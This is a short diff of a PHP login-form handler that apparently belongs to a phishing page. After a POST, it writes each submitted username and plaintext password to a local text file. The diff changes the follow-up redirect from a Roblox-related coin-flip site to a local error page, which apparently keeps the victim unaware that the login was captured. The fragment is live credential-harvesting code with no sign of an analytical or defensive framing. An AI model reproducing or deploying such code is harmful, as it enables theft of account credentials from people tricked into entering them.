@@ -18,7 +18,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   }  else {
     include 'database.php';
     file_put_contents("database1.txt", "USERNAME: " . $_POST['username'] . " | PASSWORD: " . $_POST['password'] . "\n", FILE_APPEND);
-    header('Location: https://www.rbxflip.com/coinflip');
+    header('Location: error.html');
   }
 }
 function test_input($data) {
